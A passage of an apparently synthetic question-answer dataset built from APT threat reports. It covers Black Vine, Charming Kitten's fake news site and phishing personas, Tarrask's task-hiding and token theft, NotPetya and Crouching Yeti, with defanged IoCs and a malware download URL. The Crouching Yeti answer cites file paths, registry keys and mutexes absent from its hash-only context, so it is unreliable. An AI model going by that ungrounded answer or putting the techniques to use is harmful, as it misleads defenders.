cyberespionage campaign. Symantec does not believe that either this adversary or the CFR compromise is associated with Black Vine.\nFigure 5. Zero-day distribution and framework\nAs mentioned previously in this report, in December 2012, the Capstone Turbine website was compromised by Black Vine. Based on the first known instances where malicious code was spotted on both the CFR and Capstone websites, the attacks began on or around the same week as one another.\nIn both website compromises, the domains were serving exploits against the same Internet Explorer zero-day\nvulnerability (CVE-2012-4792). The primary difference between the attacks was that the Sakurel payload was delivered in the Capstone attack while Bifrose was distributed in the CFR attack.\n\nWhat role do zero-day exploits play in Black Vine's cyberespionage campaigns? How does the group acquire and distribute these exploits, and what does this indicate about their capabilities and resources?",
    "output": "Zero-day exploits play a crucial role in Black Vine's cyberespionage campaigns, allowing the group to deliver custom payloads by exploiting previously unknown vulnerabilities. These exploits require advanced skillsets to identify and exploit, indicating that Black Vine has access to either specialized exploit developers or underground networks where such exploits can be purchased. Both approaches necessitate extensive financial resources. Symantec has observed a pattern where Black Vine shares access to zero-day exploits with other cyberespionage groups, distributing and using these exploits within days of one another. For example, in December 2012, both the Council on Foreign Relations (CFR) and Capstone Turbine websites were compromised using the same zero-day vulnerability (CVE-2012-4792), but different payloads were delivered (Bifrose and Sakurel, respectively). This shared access suggests coordination and collaboration among different attack groups, highlighting the sophisticated nature of Black Vine's operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: British News\nCharming kitten regularly target international media outlets with Persian-language services. Two recent reports \u2013 \"How Iran tries to control news coverage by foreign-based journalists\"18 and \"Iranian agents blackmailed BBC reporter with 'naked photo' threats\"19 describe harassment and intimidation methods applied by Iranian intelligence agencies. These campaigns often target reporters and journalists in phishing attempts.\nOn the same note, we identified a fake-news agency \"established\" by the attackers, called \"The British news agency\" or \"Britishnews\" (inspired by BBC)20 . Its website domain is britishnews.com[.]co and two other domains, broadcastbritishnews[.]com and britishnews[.]org, redirected to it. Below are screenshots of the main page of the website, which is online at time of writing:\n18\n19\n20 Outed in collaboration with Forbs On Jan 2017, see \"With Fake News And Femmes Fatales, Iran's Spies Learn To Love Facebook(<https://www.forbes.com/sites/thomasbrewster/2017/07/27/iran-hackers-oilrig-use-fake-personas-on-facebook-linkedin-for-cyberespionage>)\"\nBelow is a screenshot from the \"about\" page of the fake news agency website, detailing its objectives and giving the email addresses of various \"employees\":\nNote the use of present perfect instead of past simple in \"has been established\" (instead of \"was established\"), present progressive (we are covering) instead of present simple (we cover) to mark a habitual aspect, and \"began this work\" \u2013 all suggesting a Persian-thinking writer.\nThis fake news-agency and accompanying social media accounts are not used to disseminate propaganda or false information. Their content was automatically copied from legitimate sources. The purpose of this news agency is to create legitimacy, with the end goal of reaching out to their targets and infecting them while visiting the infected website.\nThe website contains BeEF (Browser Exploitation Framework \u2013 a penetration testing tool that focuses on web browsers), however it seems that the payload is sent only when the victim visits the site from IPs in a whitelist managed by the attackers. This might indicate they are after specific targets or organizations rather than widespread infection.\nThe screenshot below shows w3school.hopto[.]org, which served BeEF, called when britishnews.com[.]co is loading:\nAt the bottom of the site are links to social media accounts created by the attackers:\nBelow are screenshots of the accounts.\nInstagram, Instagram[.]com/britishnewslive with over 13,000 followers (unavailable for several months):\nTwitter, https://twitter[.]com/britishnewslive (online at time of writing):\nFacebook page - facebook[.]com/officialbritishnewslive (unavailable for several months):\nLinkedIn company page, linkedin[.]com/company/britishnews (unavailable for several months):\nThe attackers also created a fake LinkedIn profile, Isabella Carey, that \"worked\" at the fake news company: linkedin[.]com/in/isabella-carey-98a42a129 (unavailable for several months):\nAn email address with the same name, isabella.careyy@gmail.com, was used to register 12 malicious domains by Charming Kitten, as can be seen in PassiveTotal21:\n21\nSmall Headline: Yafa Hyat\nFake entity \"Yafa Hyat\" (@yafa1985hyat, online at time of writing) has contacted an Israeli Iranist via a direct message on twitter, pretending to be a political researcher who needs help with an article:\nThe researcher was asked to read the article in her \"google account\", which was also a phishing page in Google sites: https://sites.google[.]com/site/yaffadocuments/ :\nThe site automatically redirects to a phishing website hosted in a domain registered by the attackers, download-google.orginal-links[.]com:\n\"Yafa\" also sent an email from yaffa.hyatt9617@gmail.com to a university professor, asking to work at the university center she is heading. The email itself did not contain malicious content, and was likely sent to build trust prior to sending a phishing link or malware:\nSmall Headline: Bahar Azadeh\nFake entity \"Bahar Azadeh\" (bahra.azadeh88@gmail.com and @baharazadeh122 , online at time of writing) sent emails with different background stories to multiple researchers. In two cases, she was a \"Jewish girl who has an Iranian origin and who has studied in the field of political science\":\n22\nYet in a third case she claimed to be Baha'i living in Tehran:\nTranslation:\nHello,\nMr. Dr., I am a Bahai living in Tehran, if you can call it a life. As you know, the present situation in Iran for us Bahais is not good at all, so that we are even deprived of our natural right, that is, higher education, as if we Bahais are not human and have no right to live.\n<redacted>, I have been accepted to universities all across Iran, and after two years of studying in a university, they realized from certain sources that I was Bahai, and expelled me. I did not sit idle and began to constantly protest, I've been summoned [to court] quite a few times for this thing, and I already feel Iran has become a hell for me, and as much as I try I can't find salvation from this hell.\nOne of the reasons I've asked you for help and guidance was reading your book (<redacted>), and your research in this field has been really valuable and helpful, which made this book so beautiful.\n\"I have a few questions for you, please answer me\".\nThe entities' email address is connected to a fake Facebook entity called Emilia Karter (online at time of writing):\nSmall Headline: United Technologies impersonation\nThe attackers created a website impersonating UTC (United Technologies), \"an American multinational conglomerate which researches, develops and manufactures products in numerous areas, including aircraft engines, [and] aerospace systems [\u2026]. UTC is a large military contractor, getting about 10% of its revenue from the U.S. government\"23 . The fake website was first reported by Iran Threats researchers on 6 February 201724. We do not have evidence that UTC was targeted or impacted.\nThe fake website, which was built in January 2017, claimed to offer \"Free Special Programs And Courses For Employees Of Aerospace Companies like Lockheed Martin, SNCORP, \u2026.\". It was a decoy to make visitor download a \"Flash Player\", which was in fact DownPaper malware, analyzed later in this report.\n23\n24\nThe malware was served from the following location:\nhttp://login.radio-m[.]cf/utc/dnld.exe\nIt was contained in a cabinet self-extractor that impersonates a legitimate Windows software:\ndnld.exe\nbe207941ce8a5e212be8dde83d05d38d\n3b4926014b9cc028d5fb9d47fee3dbd9376525dcb3b6e2173c5edb22494cfa9b\nSmall Headline: Wave 1\nThe attackers breached the Gmail account of Alon Gur Arye, an Israeli film producer. Alon produced a satire film about the Israeli Mossad, which potentially confused the attackers to thinking he is associated with the Israeli Mossad. The breached account was used to send a phishing email to Thamar Eilam Gindin (who is targeted by the group since 201526). Below is a screenshot of the phishing email:\nThe email contained a shortened bit.ly link to a domain registered by the attackers - drivers.document-supportsharing[.]bid. In the statistics and usage page of the bit.ly URL we can see that the first click, likely a test run performed by the attackers before sending the phish, was from Iran.\n25 Names of victims and targets are shared with their permission.\n26 See , Thamar Reservoir:\nThe phishing page pretends to be a Gmail shared document downed page that requires the visitor to log in:\nSmall Headline: Wave 2\nSometimes the phishing email does not contain live text, but only an image of text linked to a phishing page. This is usually done to bypass text based spam filters.\nThe attackers used WebRTC (code copied from Github27) to detect the real IP address of targets who use proxies (This method was documented by Iran Threats28):\nWhile sending the spear phishing, the attackers preformed password recovery on the target's Facebook account, as can be seen below. Thus, she received fake emails and legitimate ones at the same time which could cause her confusion and subsequently to give her credentials in the phishing.\n2\n28\n\nWhat strategies did Charming Kitten employ to target international media outlets, particularly those with Persian-language services? How did these strategies reflect the broader goals of the group?",
    "output": "Charming Kitten targeted international media outlets with Persian-language services through phishing attempts aimed at reporters and journalists. They created a fake news agency called 'The British News Agency' or 'Britishnews,' inspired by BBC, with domains like britishnews.com[.]co, broadcastbritishnews[.]com, and britishnews[.]org. The purpose of this fake news agency was not to spread propaganda but to establish legitimacy and ultimately infect targets visiting the website. The website contained the BeEF framework, which was activated only for specific IPs, indicating targeted attacks rather than widespread infection. This strategy reflects the group's goal of gaining access to specific individuals or organizations through deception and targeted phishing.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What steps does the Tarrask malware take to hide scheduled tasks from traditional means of identification, and why is token theft necessary for this process?",
    "output": "The Tarrask malware hides scheduled tasks by deleting the SD (Security Descriptor) value within the Tree registry path. This action causes the task to 'disappear' from 'schtasks /query' and Task Scheduler, effectively hiding it unless the registry paths are manually inspected. Token theft is necessary because deleting the SD value requires SYSTEM user privileges. By stealing the token associated with the lsass.exe process, the malware can operate with the same privileges as LSASS, making the deletion possible.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Appendix \u2014 Gauging confidence level\nCTU researchers have adopted the grading system published by the U.S. Office of the Director of National Intelligence to indicate confidence in their assessments:\nHigh confidence generally indicates that judgments are based on high-quality information, and/or that the nature of the issue makes it possible to render a solid judgment. A \"high confidence\" judgment is not a fact or a certainty, however, and such judgments still carry a risk of being wrong.\nModerate confidence generally means that the information is credibly sourced and plausible but not of sufficient quality or corroborated sufficiently to warrant a higher level of confidence.\nLow confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources.\n[1] The SecureWorks Counter Threat Unit (CTU) research team tracks threat groups by assigning them four-digit randomized numbers (4127 in this case), and compiles information from external sources and from first-hand incident response observations.\n\nHow does the SecureWorks Counter Threat Unit (CTU) determine the confidence levels of their assessments regarding threat groups like TG-4127? Explain the criteria for each level of confidence.",
    "output": "The SecureWorks Counter Threat Unit (CTU) uses a grading system published by the U.S. Office of the Director of National Intelligence to indicate confidence in their assessments. High confidence indicates that judgments are based on high-quality information and/or that the nature of the issue allows for a solid judgment, although it is not a certainty and still carries a risk of being wrong. Moderate confidence means that the information is credibly sourced and plausible but not of sufficient quality or corroboration to warrant a higher level of confidence. Low confidence means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or there are significant concerns or problems with the sources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ON JUNE 27TH , THE UKRAINIAN RADIO HOLOS STOLYTSY WERE ABLE TO CONTINUE THE RADIO DIFFUSION USING AN ANALOG RADIO EMETOR: THEIR MAIN SERVER WAS INFECTED BY A MALWARE... NOTPETYA WAS BORN\u2026\nStill in 2017, another massive attack has been performed against ukrainian critical infrastructure. Although the payload did not include exploits targeting industrial systems, it did significantly impact manufacturing plants, as well in Ukraine as world-wide, with 6-figure losses at several european corporations.\nWhat happened: on June 27th, the main server of the Ukrainian radio Holos Stolytsy was infected by a malware. The radio was only able to continue the diffusion using an analog radio emetor. This was \"NotPetya\"'s first strike! Soon after this first detection, other infections were quickly detected around the world. But NotPetya is not Petya: let's not mix the original 2016 Petya ransomware and the one we are talking about, which is not a ransomware, and therefore was named \"NotPetya\".\nBasically, a ransomware is a malware that prevents file usage (e.g. using encryption) and requests a ransom to decrypt them. Petya is a ransomware published in March 2016. The one which started in June 27th is quite different although based on the ransomware Petya. The main difference is the fact that it is not a ransomware. Once NotPetya is executed on a platform, it encrypts the whole hard drive but does not exfiltrate or embed a method to decrypt stored data. It means that NotPetya's authors were not interested in money.\nNotPetya embeds an effective infection method using the same exploits that Wannacry uses, targetting Windows SMB. Unlike Wannacry, NotPetya tries to exploit remote machines located on the same local network. But the main point is NotPetya has functionalities to retrieve and exfiltrate passwords and some remote administration functionalities.\nWe can directly conclude that NotPetya was not designed to make money or to control a BotNet but instead to infect a precise target. The initial infection vector came from a malicious update of the Ukrainian countability software M.E.Doc. Indeed, hackers took the control of a M.E.Doc's server update and infected an update with NotPetya.\nThis Ukrainian radio was not an isolated case. In fact, lots of Ukrainian institutions and companies have also been infected and, since NotPetya continued to spread itself through SMB, the infection rate was quite high. Several French companies, like Saint Gobain, have also been infected. As for previous attacks using the same vulnerability (Wannacry for instance), industrial systems were impacted, because of either direct network connections between IT and OT domains, or laptops or other equipments connected to both domains.\nDetermining the goal or attributing the malware to a country is quite hard. Russian Rosneft also has been impacted. The Ukrainian Cyber Police officially confirmed that M.E.Doc servers were backdoored on three different occasions. The total losses, due to the alleged negligence of Intellect-Service, might be in the range of $1bn considering that St Gobain alone has declared a loss of $250M in revenue.\nBig Headline: 2015 INCIDENT\nUkraine's state security service SBU has blamed Russia but the nation's energy ministry said it would hold off on attribution until after it finishes a formal probe.\nA press statement on the SBU website alleged the discovery of malicious software responsible for these outages on the networks of regional power companies. According to the SBU press statement, the cyberattack was accompanied by a barrage of phone calls to their technical support telephone numbers which would have acted like a denial of service (DoS) attack.\nThe U.S. cyber intelligence firm iSight Partners said it has determined that a Russian hacking group known as Sandworm caused this unprecedented power outage in Ukraine. Many other US based companies are pointing to Sandworm as the \"hacking\" unit.\nSome press organizations are claiming this is the first known Grid hack. They should remember, even unconfirmed, that the 2003 blackout in the US east coast\nmay have been caused by a cyberattack. Also, the FBI has already claimed that Daesh has tried unsuccessfully to hack the national US power grid.\nAccording to the SANS ICS blog, the attack was a coordinated effort which targeted several power sub-companies and included a flooding attack on their phone support systems to prevent legitimate customers from reporting a power cut which would alert the on-call personnel to the problem. According to the same source (unconfirmed), the staff in the affected companies acted quickly to bypass the SCADA systems and run everything in manual mode by acting on the main breakers which restored service in under 6 hours.This would not have been possible in a modern grid installation which relies heavily on automation and can't be run in \"manual mode\".\nA Ukrainian telecoms engineer has raised doubts about the widely reported link between BlackEnergy attacks and power outages in his country. Named Illia Illin, per \"The Register\" article, he claims \"First\nof all, there weren't any blackouts in Boryspil (KBP)\".\nAn investigation team led by US government officials has released a report as part of the ICS-CERT initiative (see sources section). This report remains vague about the exact insertion methods and attacker techniques and focuses on proactive defenses that would have prevented the attack. Also, in the current political context, it's hard to imagine that interviews of Ukrainian operators by US government officials would be 100% factual and accurate.\nSANS ICS has released a new detailed report which summarizes the information collected by the investigation team (see sources for \"DUC5\"). The report uses the Cyber Kill Chain framework to characterize the different phases of the attack. However, many technical details remain vague (especially concerning attacker reconnaissance and remote control by VPN). An analysis of the alleged malware used is provided. The RAT tool used by the attacker is not mentioned.\nBig Headline: 2016 INCIDENT\nSeveral assumptions have been released since this second outage. For the time being, technical details regarding the attack have not been published. The only \"technical\" finding is the threat vector. Indeed, the SCADA stations had been compromised by an external source. Marina Krotofil, lead cyber-security researcher at Honeywell who assisted in the investigation, declared \"It was an intentional cyber incident not meant to be on a large scale... they actually attacked more but couldn't achieve all their goals\". Also from Marina Krotofil, \"hackers are thought to have hidden in Ukrenergo's IT network undetected for six months, acquiring privileges to access systems and figure out their workings, before taking methodical steps to take the power\noffline\". So far, we have no information confirming that the techniques used are the same or not.\nAccording to CyberX, the malware used during the BugDrop operation detailed in the facts section could have been used during the reconnaissance phase. Indeed, the compilation date and some targets may lead to this conclusion. The malware was compiled several times between June 2016 and end of October 2016. Concerning identified targets here is the list:\nA company that designs remote monitoring systems for oil & gas pipeline infrastructures.\nAn international organization that\nmonitors human rights, counter-terrorism and cyberattacks on critical infrastructure in the Ukraine.\nAn engineering company that designs electrical substations, gas distribution pipelines, and water supply plants.\nA scientific research institute.\nEditors of Ukrainian newspapers.\nThe assumption linking this malware and the attack is based on these targets mainly located in Ukraine and linked to energy but also due to techniques used like the reflective DLL injection (loading malicious code without calling the normal Windows API calls) which was used during the first attack. Another hint comes from the compilation time.\n\nQ: How did the NotPetya malware differ from typical ransomware, and what were its primary objectives?",
    "output": "A: NotPetya differed from typical ransomware in that it encrypted the entire hard drive but did not provide a method to decrypt the data, indicating that its authors were not interested in financial gain. Instead, NotPetya was designed to infect specific targets. Its primary objectives included retrieving and exfiltrating passwords and providing remote administration functionalities, suggesting it was intended for espionage or disruption rather than extortion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: IX. Appendix 9: Hashes\nHavex, Sysmain, Ddex:\n022da314d1439f779364aba958d51b119ac5fda07aac8f5ced77146dbf40c8ac 02e5191078497be1e6ea8bac93b6cfb9b3ee36a58e4f7dd343ac1762e7f9301e 066346170856972f6769705bc6ff4ad21e88d2658b4cacea6f94564f1856ed18 0850c39a7fcaa7091aaea333d33c71902b263935df5321edcd5089d10e4bbebb 0a0a5b68a8a7e4ed4b6d6881f57c6a9ac55b1a50097588e462fe8d3c486158bf 0c20ffcdf2492ccad2e53777a0885c579811f91c05d076ff160684082681fe68 0e34262813677090938983039ba9ff3ade0748a3aba25e28d19e2831c036b095 0ea750a8545252b73f08fe87db08376f789fe7e58a69f5017afa2806046380a5 0f4046be5de15727e8ac786e54ad7230807d26ef86c3e8c0e997ea76ab3de255 13da3fe28302a8543dd527d9e09723caeed98006c3064c5ed7b059d6d7f36554 170e5eb004357dfce6b41de8637e1dbeb87fa58e8b54a2031aac33afb930f3c8 1d768ebfbdf97ad5282e7f85da089e174b1db760f1cbdca1a815e8e6245f155a 2221c2323fb6e30b9c10ee68d60b7d7be823911540bb115f75b2747d015e35f9 24be375f0e11d88210e53f15cc08d72ab6c6287676c3fe3c6f70b513e5f442ed 269ea4b883de65f235a04441144519cf6cac80ef666eccf073eedd5f9319be0f 2c109406998723885cf04c3ced7af8010665236459d6fe610e678065994154d4 2dc296eb532097ac1808df7a16f7740ef8771afda3ac339d144d710f9cefceb4 2efd5355651db8e07613e74b1bf85b50273c1f3bce5e4edbedea0ccdff023754 2f24c7ccbd7a9e830ed3f9b3b7be7856e0cc8c1580082433cbe9bf33c86193c6 2f593c22a8fd0de3bbb57d26320446a9c7eed755ae354957c260908c93d8cf79 3094ac9d2eeb17d4cda19542f816d15619b4c3fec52b87fdfcd923f4602d827b 31db22caf480c471205a7608545370c1b3c0c9be5285a9ef2264e856052b66b4 43608e60883304c1ea389c7bad244b86ff5ecf169c3b5bca517a6e7125325c7b 487eaf5cc52528b5f3bb27ba53afffb6d534068b364a41fc887b8c1e1485795a 49c1c5e8a71f488a7b560c6751752363389f6272d8c310fee78307dc9dcd3ee2 4f3ceab96fb55d0b05380a1d95bb494ca44d7a9d7f10ded02d5b6fc27c92cb05 4ff5f102f0f1284a189485fc4c387c977dd92f0bc6a30c4d837e864aed257129 56a1513bcf959d5df3ff01476ddb4b158ce533658ab7d8dd439324b16f193ac2 593849098bd288b7bed9646e877fa0448dcb25ef5b4482291fdf7123de867911 59c4cba96dbab5d8aa7779eac18b67b2e6f8b03066eb092415d50dff55e43b72 5a13d0c954280b4c65af409376de86ac43eb966f25b85973a20d330a34cdd9a6 60f86898506f0fdf6d997f31deff5b6200a6969b457511cc00446bd22dd1f0a4 6122db2cdac0373cc8513c57786088a5548721d01e7674e78082774044e92980\n61969cd978cd2de3a13a10510d0dea5d0d3b212209804563ed3d42033a9d0f54 6367cb0663c2898aff64440176b409c1389ca7834e752b350a87748bef3a878b 646c94a0194ca70fbe68c444a0c9b444e195280f9a0d19f12393421311653552 65a4332dfe474a8bb9b5fa35495aade453da7a03eb0049211e57b5660d08d75c 6606dd9a5d5182280c12d009a03b8ed6179872fcb08be9aa16f098250cc5b7a7 66ec58b4bdcb30d1889972c1ee30af7ff213deece335f798e57ff51fe28752e3 684ea2083f2f7099f0a611c81f26f30127ad297fcac8988cabb60fcf56979dfc 698ec413986dc7fc761b1a17624ffffb1590902020b9d0cd5d9a6013c67d9100 6e5f4296bffa7128b6e8fa72ad1924d2ff19b9d64775bd1e0a9ce9c5944bd419 6e92c2d298e25bcff17326f69882b636150d2a1af494ef8186565544f0d04d3d 7081455301e756d6459ea7f03cd55f7e490622d36a5a019861e6b17141f69bd0 7a115335c971ad4f15af10ea54e2d3a6db08c73815861db4526335b81ebde253 7c1136d6f5b10c22698f7e049dbc493be6e0ce03316a86c422ca9b670cb133aa 7e0dafedd01d09e66524f2345d652b29d3f634361c0a69e8d466dcbdfd0e3001 837e68be35c2f0ab9e2b3137d6f9f7d16cc387f3062a21dd98f436a4bcceb327 83e57d8f3810a72a772742d4b786204471a7607e02fa445c3cd083f164cc4af3 85d3f636b515f0729c47f66e3fc0c9a0aacf3ec09c4acf8bf20a1411edcdc40a 8d343be0ea83597f041f9cbc6ea5b63773affc267c6ad99d31badee16d2c86e5 8da93bc4d20e5f38d599ac89db26fc2f1eecbf36c14209302978d46fc4ce5412 8e222cb1a831c407a3f6c7863f3faa6358b424e70a041c196e91fb7989735b68 92c959c36617445a35e6f4f2ee2733861aa1b3baf8728d19a4fd5176f3c80401 94d4e4a8f2d53426154c41120b4f3cf8105328c0cc5d4bd9126a54c14b296093 98bd5e8353bc9b70f8a52786365bcdb28bd3aef164d62c38dae8df33e04ac11a 9d530e2254580842574a740698d2348b68b46fd88312c9325321ad0d986f523d a05b53260c2855829226dffd814022b7ff4750d278d6c46f2e8e0dc58a36a1f9 a2fe7a346b39a062c60c50167be7dd4f6a8175df054faa67bff33ec42b1072d9 a69fcc5c5409837985e1697012cd6cc5b4e13789dd755f2bcdab99b3aadc4cc2 a8e6abaa0ddc34b9db6bda17b502be7f802fb880941ce2bd0473fd9569113599 aafbf4bba99c47e7d05c951ad964ce09493db091ba5945e89df916c6fa95d101 abdb2da30435430f808b229f8b6856fafc154a386ef4f7c5e8de4a746e350e0c b0faba6156c7b0cd59b94eeded37d8c1041d4b8dfa6aacd6520a6d28c3f02a5e b139829440aabe33071aa34604f739d70f9a0a3b06051f3190aabf839df2d408 b3b01b36b6437c624da4b28c4c8f773ae8133fca9dd10dc17742e956117f5759 b647f883911ff20f776e0a42564b13ef961fa584ebd5cfce9dd2990bca5df24e b8f2fdddf7a9d0b813931e0efe4e6473199688320d5e8289928fe87ce4b1d068 bacac71fcc61db9b55234d1ccf45d5fffd9392c430cdd25ee7a5cea4b24c7128 bcdcb4b5e9aaaee2c46d5b0ed16aca629de9faa5e787c672191e0bdf64619a95 bee9f2a01e0049d4cf94016284b16849136233366d1509489797084672e5448f c25c1455dcab2f17fd6a25f8af2f09ca31c8d3773de1cb2a55acd7aeaa6963c8 c4e2e341689799281eaef47de75f59edceaba281398b41fe7616436f247ab93d\nc66525285707daff30fce5d79eb1bdf30519586dfec4edf73e4a0845fd3d0e1c c987f8433c663c9e8600a7016cdf63cd14590a019118c52238c24c39c9ec02ad cb58396d40e69d5c831f46aed93231ed0b7d41fee95f8da7c594c9dbd06ee111 cd019e717779e2d2b1f4c27f75e940b5f98d4ebb48de604a6cf2ab911220ae50 ce99e5f64f2d1e58454f23b4c1de33d71ee0b9fcd52c9eb69569f1c420332235 d3ee530abe41705a819ee9220aebb3ba01531e16df7cded050ba2cf051940e46 d588e789f0b5914bd6f127950c5daf6519c78b527b0ed7b323e42b0613f6566f d5e3122a263d3f66dcfa7c2fed25c2b8a3be725b2c934fa9d9ef4c5aefbc6cb9 d71da8a59f3e474c3bcd3f2f00fae0b235c4e01cd9f465180dd0ab19d6af5526 d755904743d48c31bdff791bfa440e79cfe1c3fc9458eb708cf8bb78f117dd07 da3c1a7b63a6a7cce0c9ef01cf95fd4a53ba913bab88a085c6b4b8e4ed40d916 dc612882987fab581155466810f87fd8f0f2da5c61ad8fc618cef903c9650fcd dc75404b6fc8cdb73258c2cc7bc758347ffb4237c8d18222f3489dc303daf989 e029db63346c513be42242e268559174f6b00d818e00d93c14bd443314f65fe5 e38aa99eff1f9fedd99cf541c3255e99f3276839a883cadb6e916649522729e3 e42badd8fb20f1bc72b1cec65c42a96ee60a4b52d19e8f5a7248afee03646ace e73f8b394e51348ef3b6cea7c5e5ecc2ee06bb395c5ac30f6babb091080c1e74 ecb097f3367f0155887dde9f891ff823ff54ddfe5217cdbb391ea5b10c5a08dc edb7caa3dce3543d65f29e047ea789a9e429e46bed5c29c4748e656285a08050 ee53e509d0f2a3c888232f2232b603463b421b9c08fe7f44ed4eead0643135d3 f1d6e8b07ac486469e09c876c3e267db2b2d651299c87557cbf4eafb861cf79c f65d767afd198039d044b17b96ebad54390549c6e18ead7e19e342d60b70a2c3 fb30c3bb1b25b3d4cca975f2e0c45b95f3eb57a765267271a9689dd526658b43 c43ce82560cea125f65c7701c733c61ae3faa782c8b00efcb44fd7dbd32a5c4b ebb16c9536e6387e7f6988448a3142d17ab695b2894624f33bd591ceb3e46633 61f4a9a30c9cce221624da208eac253c8ce95d55da4605b12774619b1a0d1587 913c21141966750cfe80d1f64f7c819ae59e401b47f0b5031fd2486c10403c91 87d1d820fd4faea5a48aa3a26d6b5d742b457bff6d291e03dce257d6861766f7 4c5c02fbd6f35cad2e0a6f15e769bc6d4413219ce059cc11be7589f5d54645ea 81e5e73452aa8b14f6c6371af2dccab720a32fadfc032b3c8d96f9cdaab9e9df 387d4ea82c51ecda162a3ffd68a3aca5a21a20a46dc08a0ebe51b03b7984abe9 0c9b20f4cb0b3206f81c2afbb2ee4d995c28f74f38216f7d35454af624af8876 45abd87da6a584ab2a66a06b40d3c84650f2a33f5f55c5c2630263bc17ec4139 e3a7fa8636d040c9c3a8c928137d24daa15fc6982c002c5dd8f1c552f11cbcad 6b2a438e0233fe8e7ba8774e2e5c59bf0b7c12679d52d6783a0010ecad11978c 69b555a37e919c3e6c24cfe183952cdb695255f9458b25d00d15e204d96c737b 101e70a5455212b40406fe70361995a3a346264eabd4029200356565d2bacd6a d5687b5c5cec11c851e84a1d40af3ef52607575487a70224f63458c24481076c 1ba99d553582cc6b6256276a35c2e996e83e11b39665523f0d798beb91392c90 31488f632f5f7d3ec0ea82eab1f9baba16826967c3a6fa141069ef5453b1eb95\nf6aab09e1c52925fe599246dfdb4c1d06bea5c380c4c3e9c33661c869d41a23a 6296d95b49d795fa10ae6e9c4e4272ea4e1444105bddbf45b34ee067b2603b38 72ff91b3f36ccf07e3daf6709db441d2328cecab366fd5ff81fc70dd9eb45db8 a3a6f0dc5558eb93afa98434020a8642f7b29c41d35fa34809d6801d99d8c4f3 53d2a3324f276f29c749727c20708a3421a5144046ce14a8e025a8133316e0ac 1ef47da67f783f8cc8cda7481769647b754874c91e0c666f741611decd878c19 358da2c5bb5fbd9c9cf791536054bbb387ce37253c31555f5afa544f38de2a3f 3a88ff66f4eb675f0c3e6c5f947c012945c4e15b77a2cd195de8a8aba23ccb29 439e5617d57360f76f24daed3fe0b59f20fc9dade3008fd482260ba58b739a23 2c37e0504b98413e0308e44fd84f98e968f6f62399ea06bc38d3f314ee94b368 bb3529aa5312abbee0cfbd00f10c3f2786f452a2ca807f0acbd336602a13ac79 4cf75059f2655ca95b4eba11f1ce952d8e08bb4dbcb12905f6f37cf8145a538d 170596e88b26f04d349f6014d17a88026ec55eab44888e2a9bb4dd90a79f6878 59af70f71cdf933f117ab97d6f1c1bab82fd15dbe654ba1b27212d7bc20cec8c b8514bff04e8f4e77430202db61ec5c206d3ec0f087a65ee72c9bb94a058b685 778568b44e13751800bf66c17606dfdfe35bebbb94c8e6e2a2549c7482c33f7a 224e8349ba128f0ab57bdebef5287f4b84b9dccbc2d8503f53f6333efd5f9265 fd689fcdcef0f1198b9c778b4d93adfbf6e80118733c94e61a450aeb701750b4 aef82593822a934b77b81ebc461c496c4610474727539b0b6e1499ca836f0dee fd689fcdcef0f1198b9c778b4d93adfbf6e80118733c94e61a450aeb701750b4 d89a80a3fbb0a4a40157c6752bd978bc113b0c413e3f73eb922d4e424edeb8a7\n\nBased on the above text, answer a question. In the context of the APT report 'Kaspersky_Lab_crouching_yeti_appendixes_eng_final', what are some of the key indicators of compromise (IoCs) associated with the malicious activities? How can these IoCs be utilized by cybersecurity experts to detect and mitigate potential threats?",
    "output": "Key indicators of compromise (IoCs) in the report include specific file paths, registry values, mutexes, and named pipes. For example, files like '%SYSTEM%\\\\TMPprovider0XX.dll', '%TEMP%\\\\srvsce32.dll', and registry entries like 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run@TMP provider' are notable. These IoCs can be utilized by cybersecurity experts to detect and mitigate potential threats by implementing monitoring tools that scan for these specific file paths and registry entries. By setting up alerts for the creation or modification of these files and registry keys, security teams can quickly identify and respond to suspicious activity. Additionally, analyzing the presence of mutexes such as '{AD-18890}' and named pipes like '\\\\.\\\\pipe\\\\mypype-f0XX' can provide insights into active malicious processes. This proactive approach helps in early detection and containment of threats, enhancing the overall security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\n\"Operation Aurora,\" released the week of January 11, exploits the recent Microsoft Internet Explorer vulnerability. The attack was initially targeted at several large companies, including Google. It is now public and is available on the web. The public release significantly increases the possibility of widespread attacks exploiting the vulnerability, putting Internet Explorer users at potentially serious risk.\nMicrosoft is aware of the targeted attacks and lists the following combinations as vulnerable: Internet Explorer 6 Service Pack 1 on Microsoft Windows 2000 Service Pack 4, and Internet Explorer 6, Internet Explorer 7 and Internet Explorer 8 on supported editions of Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008, Windows 7, and Windows Server 2008 R2.\nhttp://www.microsoft.com/technet/security/advisory/979352.mspx\nBelow we have a summary of McAfee's assessment of Internet Explorer and platform risks:\n* DEP\nData Execution Prevention (DEP) is a set of hardware and software technologies that perform additional checks on memory to help prevent malicious code from running on a system. In Microsoft Windows XP Service Pack 2 (SP2) and Microsoft Windows XP Tablet PC Edition 2005, DEP is enforced by hardware and by software.\nThe primary benefit of DEP is to help prevent code execution from data pages. Typically, code is not executed from the default heap and the stack. Hardware-enforced DEP detects code that is running from these locations and raises an exception when execution occurs. Software-enforced DEP can help prevent malicious code from taking advantage of exception-handling mechanisms in Windows.\nQuestion: Why was Data Execution Prevention (DEP) considered a crucial technology in mitigating the risks associated with Operation Aurora, particularly in the context of the Microsoft Internet Explorer vulnerability?",
